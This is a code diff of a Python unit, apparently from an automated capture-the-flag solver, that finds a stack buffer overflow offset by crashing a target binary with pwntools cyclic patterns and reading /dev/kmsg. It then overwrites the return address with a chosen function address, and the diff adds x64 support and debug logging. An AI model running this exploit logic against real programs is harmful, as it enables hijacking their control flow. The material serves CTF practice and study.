@@ -1,12 +1,12 @@
 from pwn import *
-import units.binexp
+import units.pwnage
 import subprocess
 
 def get_escaped_string(bytestring):
 	return ''.join([chr(c) if c >= 32 and c < 127 else '\\x%02x' % (c,) for c in bytestring])
 
-class Unit(units.binexp.BasicBufferOverflowUnit):
-
+class Unit(units.pwnage.BasicBufferOverflowUnit):
+	
 	# read /dev/kmsg to find the address that the given pid segfault'd
 	def get_segfault_address(self, pid):
 		token = '{0}[{1}]: segfault'.format(os.path.basename(self.target), pid)
@@ -22,7 +22,7 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 		""" Ensure this binary is exploitable with a direct buffer overflow in STDIN """
 
 		# Look for the correct overflow length
-		for size in range(16,2048,32):
+		for size in range(16,2048,4):
 			try:
 				# Create the process
 				p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
@@ -38,6 +38,7 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 				if p.returncode == -11:
 					# Ensure we were able to read the return address from dmesg
 					address = self.get_segfault_address(p.pid)
+					log.info('{0}'.format(repr(address)))
 					if address is not None:
 						try:
 							# If this is actually a cyclic pattern, it will be decodeable
@@ -49,7 +50,13 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 							if cyclic_find(decoded) != -1:
 								self.offset = cyclic_find(decoded)
 								return
+				else:
+					log.info('no crash on {0}'.format(size))
+					log.info('payload: {0}'.format(repr(self.build_payload(katana, offset=size))))
+					print(stdout)
+					print(stderr)
 			except subprocess.TimeoutExpired:
+				log.info('timeout?')
 				# Execution expired, it's probably expecting specific input :(
 				p.kill()
 				p.communicate()
@@ -59,12 +66,15 @@ class Unit(units.binexp.BasicBufferOverflowUnit):
 		raise units.NotApplicable()
 
 	def build_payload(self, katana, data=b'', offset=0):
-		return katana.config['input'].encode('utf-8') % (cyclic(offset).encode('utf-8')+data,)
+		return katana.config['input'].replace('\\n', '\n').encode('utf-8') % (cyclic(offset).encode('utf-8')+data,)
 
 	def evaluate(self, katana, function):
 
 		# Build the payload
-		payload = self.build_payload(katana, data=p32(function), offset=self.offset)
+		if self.elf.arch == 'i386':
+			payload = self.build_payload(katana, data=p32(function), offset=self.offset)
+		elif self.elf.arch == 'x64':
+			payload = self.build_payload(katana, data=p64(function), offset=self.offset)
 
 		# Start the process
 		p = subprocess.Popen([self.target], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
